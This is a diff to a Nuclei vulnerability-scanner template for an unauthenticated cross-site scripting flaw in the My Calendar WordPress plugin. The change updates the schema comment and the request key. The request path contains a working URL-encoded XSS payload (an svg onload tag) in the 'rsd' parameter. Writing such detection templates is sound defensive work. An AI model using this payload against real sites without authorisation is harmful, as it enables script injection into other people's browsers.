@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: my-calender-xss
 info:
   name: My Calendar <= 3.1.9 - Unauthenticated Cross-Site Scripting (XSS)
@@ -5,7 +6,7 @@ info:
   severity: medium
   reference: https://wpscan.com/vulnerability/9267
   tags: wordpress
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/?rsd=%27%3E%3Csvg%2Fonload%3Dconfirm(%2F{{randstr}}%2F)%3E'
